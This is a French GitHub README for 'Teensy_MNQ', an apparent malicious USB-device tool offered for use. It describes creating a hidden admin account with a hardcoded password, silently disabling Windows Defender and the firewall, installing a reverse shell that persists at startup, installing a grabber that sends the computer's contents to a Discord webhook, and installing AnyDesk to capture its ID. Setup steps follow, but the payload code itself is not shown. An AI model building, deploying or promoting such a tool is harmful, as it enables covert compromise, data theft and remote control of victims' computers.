**Teensy_MNQ**

Ce repository contient un programme pour la Teensy ainsi que des configurations et des instructions d'installation pour la manipulation de la carte SD.

**Fonctionnalités**

- 🔐 Création d'un compte admin avec configuration du mot de passe (NagibAdmin, mot de passe : 12301230)
- 🛡️ Désactivation discrète et pas à pas de Windows Defender et du Firewall
- 🔍 Recherche automatique du port auquel l'ordinateur est connecté à la Teensy et retour de force pour la communication bidirectionnelle avec la Teensy
- ⏳ Persistance : si l'utilisateur n'est pas créé, un délai est ajouté et l'installation reprend depuis le début (rapide)
- 🔄 Installation d'un reverse shell avec persistance au démarrage
- 🎣 Installation d'un grabber envoyant tout ce qui est contenu dans le PC vers un webhook Discord
- 🖥️ Installation de AnyDesk et récupération de l'ID

**Installation**

1. Cloner ce repository sur votre ordinateur :

    ```
    git clone https://github.com/votre-utilisateur/Teensy_MNQ.git
    ```

2. Placer le fichier Arduino et les configurations dans le dossier `Teensy_SD_CARD`.

3. Suivre les instructions suivantes pour l'installation et l'exécution du programme Teensy_MNQ.

**Instructions**

**Création du compte admin**

1. Connectez la Teensy à votre ordinateur.

2. Téléversez le programme Arduino sur la Teensy.

3. Suivez les instructions affichées pour créer le compte admin avec le mot de passe fourni.

**Désactivation de Windows Defender et du Firewall**

1. Exécutez le programme Teensy_MNQ sur votre ordinateur.

2. Le programme désactivera discrètement Windows Defender et le Firewall.

**Communication avec la Teensy**

1. Une fois le compte admin créé et les protections désactivées, la Teensy sera prête à communiquer avec votre ordinateur.

2. Le programme recherchera automatiquement le port auquel la Teensy est connectée et établira une communication bidirectionnelle.

**Persistance**

1. Si le compte admin n'est pas créé, le programme attendra un délai et recommencera l'installation depuis le début.

**Installation du reverse shell**

1. Suivez les instructions spécifiques pour l'installation du reverse shell fournies dans le dossier `Teensy_SD_CARD`.

**Persistance du reverse shell au démarrage**

1. Suivez les instructions pour assurer la persistance du reverse shell au démarrage de l'ordinateur.

**Installation du grabber Discord**

1. Suivez les instructions pour l'installation du grabber Discord fournies dans le dossier `Teensy_SD_CARD`.

**Installation de AnyDesk et récupération de l'ID**

1. Suivez les instructions pour l'installation de AnyDesk et la récupération de l'ID fournies dans le dossier `Teensy_SD_CARD`.
